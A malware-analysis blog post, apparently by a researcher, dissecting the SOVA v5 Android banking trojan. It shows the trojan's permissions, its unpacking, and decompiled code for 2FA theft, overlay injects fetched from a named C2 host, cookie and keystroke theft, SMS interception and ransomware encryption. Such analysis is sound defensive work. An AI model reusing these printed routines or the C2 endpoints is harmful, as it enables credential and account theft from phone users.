{
    "id": "c4511274-4aec-4ccf-8c84-5b73c61fdc3c",
    "created_at": "2023-01-12T15:08:16.16968Z",
    "updated_at": "2025-03-27T02:06:06.910392Z",
    "deleted_at": null,
    "sha1_hash": "3342aa1de42918824ea07c55fe5fd92e34fea2a5",
    "title": "2022-09-01 - Technical analysis of SOVA android malware",
    "authors": "",
    "file_creation_date": "2022-09-12T12:00:15Z",
    "file_modification_date": "2022-09-12T12:00:15Z",
    "file_size": 2971706,
    "plain_text": "# Technical analysis of SOVA android malware\n\n**muha2xmad.github.io/malware-analysis/sova/**\n\n\nSeptember 1, 2022\n\n\n-----\n\n-----\n\n### Muhammad Hasan Ali\n\n#### Malware Analysis learner\n\n 19 minute read\n\n As-salamu Alaykum\n\n FreePalestine\n\n## Introduction\n\n#### In September 2021, SOVA, a new Android Banking Trojan, was announced in a known underground forum. It had multiple capabilities and was basically almost in the go-to market phase.Until March 2022, multiple versions of SOVA were found and some of these features were already implemented, such as: 2FA interception, cookie stealing and injections for new\n\n\n-----\n\n#### targets and countries (e.g. multiple Philippine banks). In July 2022, we discovered a new version of SOVA (v4) which presents new capabilities and seems to be targeting more than 200 mobile applications, including banking apps and crypto exchanges/wallets. Starting from May 2022, Threat Actors (TAs) behind SOVA have started to deliver a new version of their malware, hiding within fake Android applications that show up with the logo of a few famous ones, like Chrome, Amazon, NFT platform or others.\n\n Download the sample from malwarebazaar\n\n## Explore AndroidManifest.xml\n```\nAndroidManifest.xml is not human-readable so we use apktool to decompile the apk\n\n#### first to be able to read the AndroidManifest.xml . We need to read this file to know the ability of this malicious APK and know more inforamation such as entry points for the app, Activities, Services, Intents, app permissions, and package name.\n\n```\n\n-----\n\n```\n<uses feature android:name android.hardware.telephony />\n\n  <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>\n\n  <uses-permission android:name=\"android.permission.QUERY_ALL_PACKAGES\"/>\n\n  <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>\n\n  <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>\n\n  <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>\n\n  <uses-permission\nandroid:name=\"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\"/>\n\n  <uses-permission android:name=\"android.permission.USE_FINGERPRINT\"/>\n\n  <uses-permission android:name=\"android.permission.GET_TASKS\"/>\n\n  <uses-permission\nandroid:name=\"com.google.android.gms.permission.ACTIVITY_RECOGNITION\"/>\n\n  <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n\n  <uses-permission android:name=\"android.permission.RECEIVE_LAUNCH_BROADCASTS\"/>\n\n  <uses-permission android:name=\"android.permission.REQUEST_DELETE_PACKAGES\"/>\n\n  <uses-permission\nandroid:name=\"android.permission.ACTION_MANAGE_OVERLAY_PERMISSION\"/>\n\n  <uses-permission android:name=\"android.permission.CALL_PHONE\"/>\n\n  <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>\n\n  <uses-permission android:name=\"android.permission.ACCESS_BACKGROUND_LOCATION\"/>\n\n  <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>\n\n  <uses-permission android:name=\"android.permission.QUICKBOOT_POWERON\"/>\n\n  <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>\n\n  <uses-permission android:name=\"android.permission.FOREGROUND_SERVICE\"/>\n\n  <uses-permission android:name=\"android.permission.BLUETOOTH\"/>\n\n  <uses-permission android:name=\"android.permission.GET_ACCOUNTS\"/>\n\n  <uses-permission android:name=\"android.permission.CHANGE_NETWORK_STATE\"/>\n\n  <uses-permission android:name=\"android.permission.CLEAR_APP_CACHE\"/>\n\n  <uses-permission android:name=\"android.permission.INTERNET\"/>\n\n  <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>\n\n  <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\"/>\n\n  <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>\n\n  <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>\n\n  <uses-permission android:name=\"android.permission.INSTALL_PACKAGES\"/>\n\n  <uses-permission android:name=\"android.permission.QUERY_ALL_PACKAGES\"/>\n\n  <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>\n\n  <uses-permission android:name=\"android.permission.READ_SMS\"/>\n\n  <uses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\"/>\n\n  <uses-permission android:name=\"android.permission.SYSTEM_ALERT_WINDOW\"/>\n\n  <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n\n  <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>\n\n  <uses-permission android:name=\"android.permission.REORDER_TASKS\"/>\n\n  <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>\n\n  <uses-permission android:name=\"android.permission.REQUEST_INSTALL_PACKAGES\"/>\n\n  <uses-permission android:name=\"android.permission.READ_PHONE_NUMBERS\"/>\n\n  <uses-permission android:name=\"android.permission.DISABLE_KEYGUARD\"/>\n\n  <uses-permission android:name=\"android.permission.SEND_SMS\"/>\n\n  <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>\n\n  <uses-permission android:name=\"android.permission.MODIFY_AUDIO_SETTINGS\"/>\n\n  <uses-permission android:name=\"android.permission.VIBRATE\"/>\n\n```\n\n-----\n\n#### The malware gets lots of permissions to steal SMS such as READ_SMS, SEND_SMS, and\n```\nRECEIVE_SMS, get permission to steal contacts such as READ_CONTACTS,\nWRITE_CONTACTS, and READ_PHONE_NUMBERS, get permission to un/install packages such\n\n as QUERY_ALL_PACKAGES, REQUEST_INSTALL_PACKAGES, INSTALL_PACKAGES, and\nREQUEST_DELETE_PACKAGES to launch overlay attack when a specific application is\n\n launched usually bank apps, gets permission to access the location of the victim’s phone such as ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION, and\nACCESS_BACKGROUND_LOCATION .\n\n Other permissions such as DISABLE_KEYGUARD to disable the phone lock for the time being the application is used, REORDER_TASKS this Allows the app to move tasks to the foreground and background, RECORD_AUDIO allow the app to record audio, CALL_PHONE Allows an application to initiate a phone call without going through the Dialer user interface,\nACTION_MANAGE_OVERLAY_PERMISSION controlling which apps can draw on top of other\n\n apps helps the overlay attack, RECEIVE_BOOT_COMPLETED to receive a notification when the system finishes booting.\n\n We get the Entry point of the malicious application\n\n##### com.devapprove.a.ru.news.ui.LauncherActivity which is not found the\n#### classes.dex. So this an indication that the malware is packed and other classes will be loaded into application at run-time. And we need to unpack it so the malware will drop the decrypted dex file which contains the malicious functions the malware will do to the victim’s device such as stealing SMS or how the malware will communicate to the C2 server.\n<activity android:exported=\"true\"\nandroid:name=\"com.devapprove.a.ru.news.ui.LauncherActivity\"\nandroid:theme=\"@android:style/Theme.Translucent.NoTitleBar.Fullscreen\">\n\n      <intent-filter>\n\n        <category android:name=\"android.intent.category.LAUNCHER\"/>\n\n        <action android:name=\"android.intent.action.MAIN\"/>\n\n      </intent-filter>\n\n    </activity>\n\n This service called HeadlessSmsSendService using SEND_RESPOND_VIA_MESSAGE permission, which enables the malware to send a request to other apps to handle respond- via-message events for incoming calls.\n\n```\n\n-----\n\n```\n <service android:exported true \nandroid:name=\"com.devapprove.a.ru.news.HeadlessSmsSendService\"\nandroid:permission=\"android.permission.SEND_RESPOND_VIA_MESSAGE\">\n\n      <intent-filter>\n\n        <action android:name=\"android.intent.action.RESPOND_VIA_MESSAGE\"/>\n\n        <category android:name=\"android.intent.category.DEFAULT\"/>\n\n        <data android:scheme=\"sms\"/>\n\n        <data android:scheme=\"smsto\"/>\n\n        <data android:scheme=\"mms\"/>\n\n        <data android:scheme=\"mmsto\"/>\n\n      </intent-filter>\n\n    </service>\n\n#### The malware will use NotificationService service to handle the device notification. The malware will be able to read/write all device notifications such as SMS notifications and messages notifications and system notifications. This used to intercept when 2FA SMS revieved or OTP SMS.\n<service android:enabled=\"true\" android:exported=\"false\"\nandroid:name=\"com.devapprove.a.ru.news.service.NotificationService\"\nandroid:permission=\"android.permission.BIND_NOTIFICATION_LISTENER_SERVICE\">\n\n      <intent-filter>\n\n        <action\nandroid:name=\"android.service.notification.NotificationListenerService\"/>\n\n      </intent-filter>\n\n    </service>\n\n The malware uses this service AppAccessibilityService to decalare an\nAccessibility Service in the Android manifest. An accessibility service is an application\n\n that provides user interface enhancements to assist users with disabilities, or who may temporarily be unable to fully interact with a device. And the capabilities the malware requests are in @xml/accessibilityservice in res folder.\n<service android:exported=\"false\" android:label=\"@string/app_name\"\nandroid:name=\"com.devapprove.a.ru.news.service.AppAccessibilityService\"\nandroid:permission=\"android.permission.BIND_ACCESSIBILITY_SERVICE\">\n\n      <intent-filter>\n\n        <action\nandroid:name=\"android.accessibilityservice.AccessibilityService\"/>\n\n      </intent-filter>\n\n      <meta-data android:name=\"android.accessibilityservice\"\nandroid:resource=\"@xml/accessibilityservice\"/>\n\n    </service>\n\n The capabilities in @xml/accessibilityservice are canRetrieveWindowContent to retrieve the content of the window, accessibilityEventTypes to get all types of events which helps the malware to maintain more presitence in the victim’s device.\n\n```\n\n-----\n\n#### This allows the malware to get SMS notifications when the device gets SMS message. The malware set the priority to 9999 which allows the malware to get the SMS notification before the system messaging apps. Then the malware deletes or send it to C2 server or do whatever he wants. This helps stealing 2FA SMS.\n```\n<receiver android:enabled=\"true\" android:exported=\"true\"\nandroid:name=\"com.devapprove.a.ru.news.SmsReceiver\"\nandroid:permission=\"android.permission.BROADCAST_SMS\">\n\n      <intent-filter android:priority=\"9999\">\n\n        <action android:name=\"android.provider.Telephony.SMS_DELIVER\"/>\n\n      </intent-filter>\n\n    </receiver>\n\n\n## Dive into packed classes.ex\n\n#### Now after we know that the malware is packed which will drop the unpacked file which contains the malicious functions the malware will do to the victim’s device. Another indication of packing by using droidlysis tool which extracts properties about the app. droidlysis -input 7c805f51ee3b2994e742d73954e51d7c2c24c76455b0b9a1b44d61cb4e280502.apk .\n\n We get lots of info about the app such as activities, permissions, urls, and suspecious classes.\n\n Suspicious classes such as DexClassLoader which is A class loader that loads classes from . jar and .apk files containing a classes.dex entry. This can be used to execute code not installed as part of an application. The most important parameter the\nDexClassLoader is the first parameter dexPath which represent path to the unpacked\n\n dex. We will get the name of the encrypted file which will be loaded at runtime. The name will be in plaintext or will be encoded, we will see….\n\n Figure(1): DexClassLoader class\n\n How we will find this file?\n\n You can see the Unpacking video from Here\n\n```\n\n-----\n\n#### First search for DexClassLoader in the decompiler such as jadx-gui . Then the find reference by pressing x to class, and keep finding reference until finding\n```\nattachBaseContext method, which is the function that packers usually override to perform\n\n these tasks since it is called by the framework even before.\n\n After searching for DexClassLoader, we find uncovercherry class we use x to find reference to this class.\n\n Figure(2): DexClassLoader class and uncovercherry\n\n Figure(3): find ref to uncovercherry is vibrantcricket\n\n Figure(4): find ref to vibrantcricket is damageinform\n\n```\n\n-----\n\n#### Figure(5): find ref to damageinform is decreasespare\n\n Figure(6): find ref to decreasespare is attachBaseContext Now we find String dexpath = nobleamong(clusterhole);, we enter nobleamong class, then we get return nuclearinquiry(str);, enter nuclearinquiry, then\n```\ninflictair . We get return new File(str, this.REpOzCiHoGjQpWpQqNnBtIu);,\n\n enter REpOzCiHoGjQpWpQqNnBtIu, and then ketchupold, then globeonline .\n\n Now, in this class we will get the name of the encrypted file which will be loaded in runtime. But it seems to be encoded, so we need to write code to decode it.\nThe code is full of junk code, we will try to clean it.\n\n```\n\n-----\n\n#### Figure(7): encoded name of encrypted file After cleaning the code, and run the code the result will be Decoded filename:\n```\nCtaDwII.json . So the file name will be CtaDwII.json .\npublic class Main\n\n{\n\n  public static String lawtwist(int arg9) {\n\n     byte[] encrypted = new byte[] {80, 103, 114, 87, 100, 90, 90, 61, 121, 96,\n124, 125};\n\n     byte[] result = new byte[12];\n     byte[] key = new byte[]{19};\n\n     int i = 0;\n\n     while (i < 12) {\n\n       result[i] = (byte)( encrypted[i] ^ key[i % 1]);\n\n       i++;\n\n     }\n\n     return new String(result);\n\n     }\n\n     public static void main(String[] args) {\n\n          System.out.println(\"Decoded filename: \"+ Main.lawtwist(0 /* whatever\n*/));\n\n     }\n\n}\n\n Now how we will get the file? We will run the APK in virtual environment such as android\nstudio then we use adb to pull the decrypted file.\n\n```\n\n-----\n\n#### So we need to know where the decrypted CtaDwII.json file will be unpacked in android\n\n##### studio, you can use Dexcalibur but I have problems while installing, so I used Hatching\n#### triage report to locate the decrypted CtaDwII.json file. The file is located in\n```\n/data/user/0/com.bean.cousin/app_DynamicOptDex/CtaDwII.json . before we pull the\n\n file, you need to copy CtaDwII.json to a user folder not root folder such as /sdcard/ then pull this dex file which we will analyze instead of classes.dex . The decrypted\nCtaDwII.json file SHA256 hash:\nf6776bddb6a62dfaabcdf46eb1d5e22374ba0cfbabc45915ba887637b2f28c71 .\n\n## Dive into droped dex\n\n#### SOVA malware has multible versions, in each version malware authors implements new features. This sample is SOVA v5. And new features got added such as ransomware capability with AES algorithm.\n\n In Const method, we get all the capabilities of the malware. The malware can do malicious functions such as intercepting 2FA, delete app, steal SMS and contacts, forward calls, keylogger,or mute the device. In the end, I will explain in brief every function the malware does.\n\n```\n\n-----\n\n```\n Const.INSTANCE new Const();\n\n    Const.PERMISSION_LIST = Build.VERSION.SDK_INT < 26 ? CollectionsKt.listOf(new\nString[]{\"android.permission.READ_SMS\", \"android.permission.SEND_SMS\",\n\"android.permission.RECEIVE_SMS\", \"android.permission.READ_CONTACTS\",\n\"android.permission.WRITE_CONTACTS\", \"android.permission.READ_PHONE_STATE\"}) :\nCollectionsKt.listOf(new String[]{\"android.permission.READ_SMS\",\n\"android.permission.SEND_SMS\", \"android.permission.RECEIVE_SMS\",\n\"android.permission.READ_CONTACTS\", \"android.permission.WRITE_CONTACTS\",\n\"android.permission.READ_PHONE_STATE\", \"android.permission.WRITE_EXTERNAL_STORAGE\",\n\"android.permission.MODIFY_AUDIO_SETTINGS\",\n\"android.permission.READ_EXTERNAL_STORAGE\", \"android.permission.INSTALL_PACKAGES\",\n\"android.permission.CALL_PHONE\", \"android.permission.GET_ACCOUNTS\",\n\"android.permission.READ_PHONE_NUMBERS\", \"android.permission.CLEAR_APP_CACHE\"});\n\n    Const.get2fa = \"get2fa\";\n\n    Const.start2faactivator = \"start2faactivator\";\n\n    Const.stop2faactivator = \"stop2faactivator\";\n\n    Const.delbot = \"delbot\";\n\n    Const.openUrl = \"openurl\";\n\n    Const.startlock = \"startlock\";\n\n    Const.stoplock = \"stoplock\";\n\n    Const.admin = \"getperm\";\n\n    Const.delapp = \"delapp\";\n\n    Const.starthidenpush = \"starthidenpush\";\n\n    Const.stophidenpush = \"stophidenpush\";\n\n    Const.hidesms = \"starthidesms\";\n\n    Const.stophidensms = \"stophidesms\";\n\n    Const.scancookie = \"scancookie\";\n\n    Const.stopcookie = \"stopcookie\";\n\n    Const.scaninject = \"scaninject\";\n\n    Const.stopscan = \"stopscan\";\n\n    Const.getsms = \"getsms\";\n\n    Const.startkeylogs = \"startkeylogs\";\n\n    Const.stopkeylogs = \"stopkeylogs\";\n\n    Const.contactssender = \"contactssender\";\n\n    Const.sendsms = \"sendsms\";\n\n    Const.openinject = \"openinject\";\n\n    Const.getapps = \"getapps\";\n\n    Const.sendpush = \"sendpush\";\n\n    Const.enableinject = \"enableinject\";\n\n    Const.runapp = \"runapp\";\n\n    Const.callForward = \"forwardcall\";\n\n    Const.call = \"call\";\n\n    Const.disableinject = \"disableinject\";\n\n    Const.getcontacts = \"getcontacts\";\n\n    Const.startMute = \"startmute\";\n\n    Const.stopMute = \"stopmute\";\n\n    Const.gettrustwallet = \"gettrustwallet\";\n\n    Const.getexodus = \"getexodus\";\n\n    Const.remote = new Remote(null, null, null, 7, null);\n\n```\n\n-----\n\n#### Now I will start explaining the major functions of the malware such as Stealing SMS and contacts, ransomware, intercept 2FA, overlay attack, forward call, and mute state. In\n```\nPingTasks method, we will find commands from C2 server which will be received to the\n\n malware to do the malicous functions. We will show the command from the C2 server and then explain the function of the command.\n\n In this version of SOVA, the malware comes with ransomware capability which will encrypt the victim’s files with AES algorithm and the extenstion of the encrypted files will be .enc .\n\n```\n\n-----\n\n```\n public void onCreate() {\n\n    Intrinsics.checkNotNullExpressionValue(\"Created encryptor service\",\n\"TDE(\\\"Created encryptor service\\\")\");\n\n    RemoteLogger.log$default(this.logger, \"Created encryptor service\", null,\nnull, null, 14, null);\n\n    super.onCreate();\n\n  }\n\n  @Override // android.app.Service\n\n  public void onDestroy() {\n\n    super.onDestroy();\n\n    Intrinsics.checkNotNullExpressionValue(\"Destroyed encryptor service\",\n\"TDE(\\\"Destroyed encryptor service\\\")\");\n\n    RemoteLogger.log$default(this.logger, \"Destroyed encryptor service\", null,\nnull, null, 14, null);\n\n  }\n\n  private final void onEncryptionEnd() {\n\n    Intrinsics.checkNotNullExpressionValue(\"Stopped encryptor\", \"TDE(\\\"Stopped\nencryptor\\\")\");\n\n    RemoteLogger.log$default(this.logger, \"Stopped encryptor\", null, null, null,\n14, null);\n\n    this.preferences.isDeviceEncrypted(Boolean.valueOf(true));\n\n    this.stopForeground(true);\n\n    this.stopSelf();\n\n  }\n\n  private final void onEncryptionStart() {\n\n    if((Preferences.isDeviceEncrypted$default(this.preferences, null, 1, null))\n&& this.mode == WorkType.ENCRYPT) {\n\n      Intrinsics.checkNotNullExpressionValue(\"Device already encrypted\",\n\"TDE(\\\"Device already encrypted\\\")\");\n\n      RemoteLogger.log$default(this.logger, \"Device already encrypted\", null,\nnull, null, 14, null);\n\n      this.stopForeground(true);\n\n      this.stopSelf();\n\n    }\n\n    Intrinsics.checkNotNullExpressionValue(\"Started encryptor\", \"TDE(\\\"Started\nencryptor\\\")\");\n\n    RemoteLogger.log$default(this.logger, \"Started encryptor\", null, null, null,\n14, null);\n\n    Function1 function10 = (Function1)new\nEncryptorService.onEncryptionStart.1(this);\n\n    this.aesEncryptor.setLog(function10);\n\nBuildersKt__Builders_commonKt.launch$default(CoroutineScopeKt.CoroutineScope(((Corouti\n null, null, ((Function2)new EncryptorService.onEncryptionStart.2(this, null)), 3,\nnull);\n\n  }\n\n  @Override // android.app.Service\n\n```\n\n-----\n\n```\n  public int onStartCommand(Intent intent0, int v, int v1) {\n\n    this.startForeground(3,\nContextNotificationExtensions.INSTANCE.createManagingServiceNotification(((Context)thi\n\n    this.mode = intent0 == null || !intent0.getBooleanExtra(\"decrypt\", false) ?\nWorkType.ENCRYPT : WorkType.DECRYPT;\n\n    this.onEncryptionStart();\n\n    return 1;\n\n  }\n\n#### The malware will receive a command related to two factor authentication 2FA to start or stop collecting 2FA authentication codes from victim device then send 2FA message to the C2 server. The malware will run the Google Authenticator app and get the content of the opened interface by abusing Accessibility Service .\nif(Intrinsics.areEqual(s, \"start2faactivator\")) {\n\n      preferences0.is2FAActivatorEnabled(boolean0);\n\n      return;\n\n    }\n\n    Inject inject0 = null;\n\n    if(Intrinsics.areEqual(s, \"stop2faactivator\")) {\n\n      Log.d(\"2FA\",\nString.valueOf(Preferences.is2FAActivatorEnabled$default(preferences0, null, 1,\nnull)));\n\n      preferences0.is2FAActivatorEnabled(Boolean.valueOf(false));\n\n      return;\n\n    }\n\n    if(Intrinsics.areEqual(s, \"get2fa\")) {\n\n      AppKt.log$default(this, \"Request Google auth app\", null, null, 6, null);\n\n      if(!workerService1.checkScreenState(command0)) {\n\n        return;\n\n      }\n\n      if(ContexStartExtensionsKt.startApp(context0,\n\"com.google.android.apps.authenticator2\")) {\n\n        preferences0.is2FARequested(boolean0);\n\n        return;\n\n      }\n\n    }\n\n The malware will try to steal 2FA codes generated by Google Authenticator app. This can happen if the malware take Accessibility Service permission. If the authenticator app is running, the malware can get the content of the opened activity(interface) and then upload this information to the C2 server. By this way, the malware can get the 2FA to bypass the protection of the banking accounts.\n\n```\n\n-----\n\n```\npublic final boolean is2FAActivatorEnabled(Boolean boolean0) {\n\n    if(boolean0 != null) {\n\n      this.prefsEditor().putBoolean(\"is2FAActivatorEnabled\",\nboolean0.booleanValue()).apply();\n\n      return boolean0.booleanValue();\n\n    }\n\n    return this.prefs().getBoolean(\"is2FAActivatorEnabled\", false);\n\n  }\n\n  public static boolean is2FAActivatorEnabled$default(Preferences preferences0,\nBoolean boolean0, int v, Object object0) {\n\n    if(object0 == null) {\n\n      if((v & 1) != 0) {\n\n        boolean0 = null;\n\n      }\n\n      return preferences0.is2FAActivatorEnabled(boolean0);\n\n    }\n\n    throw new UnsupportedOperationException(\"Super calls with default arguments\nnot supported in this target, function: is2FAActivatorEnabled\");\n\n  }\n\n  public final boolean is2FARequested(Boolean boolean0) {\n\n    if(boolean0 != null) {\n\n      this.prefsEditor().putBoolean(\"is2FARequested\",\nboolean0.booleanValue()).apply();\n\n      return boolean0.booleanValue();\n\n    }\n\n    return this.prefs().getBoolean(\"is2FARequested\", false);\n  }\n\n  public static boolean is2FARequested$default(Preferences preferences0, Boolean\nboolean0, int v, Object object0) {\n\n    if(object0 == null) {\n\n      if((v & 1) != 0) {\n\n        boolean0 = null;\n\n      }\n\n      return preferences0.is2FARequested(boolean0);\n\n    }\n\n    throw new UnsupportedOperationException(\"Super calls with default arguments\nnot supported in this target, function: is2FARequested\");\n\n  }\n\n#### The malware will perform overlay attack when the victim opens a specific app usually banking apps or cryptocurrency apps to steal the victim’s credentials. In prevouis versions, the malware puts targeted apps in packageList.txt in assets/ folder. In version 5, the\n\n```\n\n-----\n\n#### malware will request all installed packages on the victim s device, and then reqest needed WebViews for targeted apps. The command openinject will open the downloaded WebView by requesting injectlist from the C2 server satandemantenimiento[].]com when a targeted app opened. The malware knows that the vicitm opens a targeted app by monitoring the screen.\n```\n if(Intrinsics.areEqual(s, \"openinject\")) {\n\n              Companion browserActivity$Companion0 =\nBrowserActivity.Companion;\n\n              Context context7 =\nworkerService0.getApplicationContext();\n\n              Intrinsics.checkNotNullExpressionValue(context7,\n\"workerService.applicationContext\");\n\n              StringBuilder stringBuilder0 = new\nStringBuilder().append(\"http://satandemantenimiento.com\").append(\"/downloadinject?\naccess=\").append(\"1\").append(\"&packagename=\");\n\n              List list0 = command0.getInjectlist();\n\n              if(list0 != null) {\n\n                inject0 = (Inject)list0.get(0);\n\n              }\n\n              Intrinsics.checkNotNull(inject0);\n\nworkerService1.startActivity(browserActivity$Companion0.newInstance(context7,\nstringBuilder0.append(inject0.getPacket()).append(\"&type=html\").toString(),\n((Inject)command0.getInjectlist().get(0)).getGetcookie(),\n((Inject)command0.getInjectlist().get(0)).getPacket()).addFlags(0x10000000));\n\n              return;\n\n            }\n\n if(Intrinsics.areEqual(s, \"enableinject\")) {\n\n                this.scanInject(command0, workerService0);\n\n                return;\n\n              }\n\n if(Intrinsics.areEqual(s, \"disableinject\")) {\n\n                Preferences preferences1 =\nworkerService0.getPreferences();\n\n                List list1 = command0.getInjectlist();\n\n                Intrinsics.checkNotNull(list1);\n\n                preferences1.deleteInjects(list1);\n\n                return;\n\n And the scanInject class to update the list of targeted apps.\n\n```\n\n-----\n\n```\nprivate final void scanInject(Command command0, WorkerService workerService0) {\n\n    Log.d(\"INJCTS - scan\", String.valueOf(command0.getInjectlist()));\n\n    for(Object object0: (command0.getInjectlist() == null ?\nCollectionsKt.emptyList() : command0.getInjectlist())) {\n\n      Inject inject0 = (Inject)object0;\n\n      workerService0.getPreferences().addInject(inject0);\n\n      AppKt.log$default(this, inject0 + \" ENABLED\", null, null, 6, null);\n\n    }\n\n  }\n\n#### This how malware perform overlay attack. And the malware will try to steal cookie using\ngetCookie command -which we will explain- using cookieManager .\n\n```\n\n-----\n\n```\n protected void onCreate(Bundle bundle0) {\n\n    super.onCreate(bundle0);\n\n    this.getWindow().requestFeature(8);\n\n    ActionBar actionBar0 = this.getActionBar();\n\n    if(actionBar0 != null) {\n\n      actionBar0.hide();\n\n    }\n\n    this.setTitle(\"\");\n\n    try {\n\n      this.setContentView(0x7F0B0022);\n\n      View view0 = this.findViewById(0x7F0800B8);\n\n      Intrinsics.checkNotNullExpressionValue(view0,\n\"findViewById(R.id.web_view)\");\n\n      WebView webView0 = (WebView)view0;\n\n      webView0.getSettings().setJavaScriptEnabled(true);\n\n      String s = null;\n\n      webView0.setLayerType(2, null);\n\n      String s1 = this.getIntent().getStringExtra(\"link\");\n\n      Log.i(\"INJECT_URL\", Intrinsics.stringPlus(\"\", s1));\n\n      boolean z = this.getIntent().getBooleanExtra(\"getCookie\", false);\n\n      this.packet = this.getIntent().getStringExtra(\"packet\");\n\n      StringBuilder stringBuilder0 = new StringBuilder().append(\"Web activity\nstarted. Navigate to: \");\n\n      if(s1 != null) {\n\n        s = s1.toString();\n\n      }\n\n      AppKt.log$default(this, stringBuilder0.append(s).append(\". Get cookie:\n\").append(((boolean)(((int)z)))).toString(), null, null, 6, null);\n\n      CookieManager cookieManager0 = CookieManager.getInstance();\n\n      CookieSyncManager.createInstance(this.getApplicationContext());\n\n      if(Build.VERSION.SDK_INT >= 21) {\n\n        cookieManager0.setAcceptThirdPartyCookies(webView0, true);\n\n      }\n\n      else {\n\n        cookieManager0.setAcceptCookie(true);\n\n      }\n\n      cookieManager0.acceptCookie();\n\n      CookieSyncManager.getInstance().startSync();\n\n      Intrinsics.checkNotNullExpressionValue(cookieManager0, \"cookieManager\");\n\n      this.setClient(webView0, ((boolean)(((int)z))), cookieManager0);\n\n      this.setChromeClient(webView0);\n\n      webView0.getSettings().setDomStorageEnabled(true);\n\n      webView0.addJavascriptInterface(new BrowserActivity.onCreate.1(this),\n\"Android\");\n\n      webView0.addJavascriptInterface(new BrowserActivity.onCreate.2(),\n\"recorder\");\n\n      if(s1 != null) {\n\n        webView0.loadUrl(s1);\n\n        return;\n\n```\n\n-----\n\n```\n      }\n\n    }\n\n    catch(Exception unused_ex) {\n\n      return;\n\n    }\n\n  }\n\n#### The malware will steal Cookies from the opened apps using scancookie using\ncookieManager . After collecting Cookies the malware will stop scan using stopcookie\n\n command. The malware sends the stolen Cookies to /testpost.php .\n if(Intrinsics.areEqual(s, \"scancookie\")) {\n\n            try {\n\n              this.scanCookie(command0, workerService0);\n\n            }\n\n            catch(Exception unused_ex) {\n\n            }\n\n            return;\n\n          }\n\nif(Intrinsics.areEqual(s, \"stopcookie\")) {\n\n            AppKt.log$default(this, \"stop cookie received. cleaning\npreferences ...\", null, null, 6, null);\n\n            workerService0.getPreferences().currentCookie(\"[]\");\n\n            return;\n\n          }\n\nif(Intrinsics.areEqual(s, \"stopscan\")) {\n\n            workerService0.getPreferences().currentCookie(\"[]\");\n\n            return;\n\n          }\n\n\n The malware has the capabbility to store key strokes of the victim using startkeylogs . This helps to steal the victim’s banking credentials or login credentials. The malware sends the stored keylogs to /keylog.php . And stop storing keylogs using stopkeylogs .\n if(Intrinsics.areEqual(s, \"stopkeylogs\")) {\n\n            preferences0.isKeyLoggerIsEnabled(Boolean.valueOf(false));\n\n            return;\n\n          }\n\nif(Intrinsics.areEqual(s, \"startkeylogs\")) {\n\n            preferences0.isKeyLoggerIsEnabled(boolean0);\n\n            return;\n\n          }\n\n\n```\n\n-----\n\n#### The malware will set the device to mute state using startmute command. So when the device gets a notification the victim won’t notice. Then the malware will intercept the coming SMS. This makes the received SMS hidden from the victim. This useful for the attacker to get OTP. By using stophidesms command, this command stops hidding received SMS. Another command is to get SMS getsms to get the stored SMS on the victim’s device then upload to C2 server using sendsms command.\n\n\n-----\n\n```\nif(Intrinsics.areEqual(s, stophidesms )) {\n\n          if(!workerService1.checkScreenState(command0)) {\n\n            return;\n\n          }\n\nif(Intrinsics.areEqual(Telephony.Sms.getDefaultSmsPackage(context0),\nworkerService0.getPackageName())) {\n\n            preferences0.loopnotifEnabled(Boolean.valueOf(false));\n\n            this.stopHiddenPush(workerService1);\n\nworkerService0.getPreferences().isHiddenSMSEnabled(Boolean.valueOf(false));\n\nworkerService0.getPreferences().isNeedChangeDefaultToChrome(false);\n\nworkerService0.getPreferences().isNeedChangeDefaultToMessages(true);\n\n            Context context3 = workerService0.getApplicationContext();\n\n            Intrinsics.checkNotNullExpressionValue(context3,\n\"workerService.applicationContext\");\n\n            if(!ContexStartExtensionsKt.startApp(context3,\n\"com.samsung.android.messaging\")) {\n\n              Context context4 =\nworkerService0.getApplicationContext();\n\n              Intrinsics.checkNotNullExpressionValue(context4,\n\"workerService.applicationContext\");\n\n              if(!ContexStartExtensionsKt.startApp(context4,\n\"com.android.messaging\")) {\n\n                Context context5 =\nworkerService0.getApplicationContext();\n\n                Intrinsics.checkNotNullExpressionValue(context5,\n\"workerService.applicationContext\");\n\n                if(!ContexStartExtensionsKt.startApp(context5,\n\"com.google.android.apps.messaging\")) {\n\n                  Context context6 =\nworkerService0.getApplicationContext();\n\n                  Intrinsics.checkNotNullExpressionValue(context6,\n\"workerService.applicationContext\");\n\n                  ContexStartExtensionsKt.startApp(context6,\n\"com.android.mms\");\n\n                  return;\n\n                }\n\n              }\n\n            }\n\n          }\n\n        }    \n\nif(Intrinsics.areEqual(s, \"getsms\")) {\n\n            ContexStartExtensionsKt.overlay$default(context0, 0,\n((Function0)new PingTasks.onPingReceived.3(workerService1)), 0, 5, null);\n\n            return;}\n\n if(Intrinsics.areEqual(s, \"sendsms\")) {\n\n            ContexStartExtensionsKt.sendSMS(context0,\ncommand0.getNumber(), command0.getText());\n\n```\n\n-----\n\n```\n            return;}\n\n if(Intrinsics.areEqual(s, \"startmute\")) {\n\n                this.mutePhone(context0);\n\n                return;\n\n              }\n\nif(Intrinsics.areEqual(s, \"stopmute\")) {\n\n                this.unmutePhone(context0);\n\n                return;\n\n              }\n\n\n#### The malware collect the SMS stored in the victim’s device and send it to C2 server. This happens by collecting the body and the address(number) of the SMS 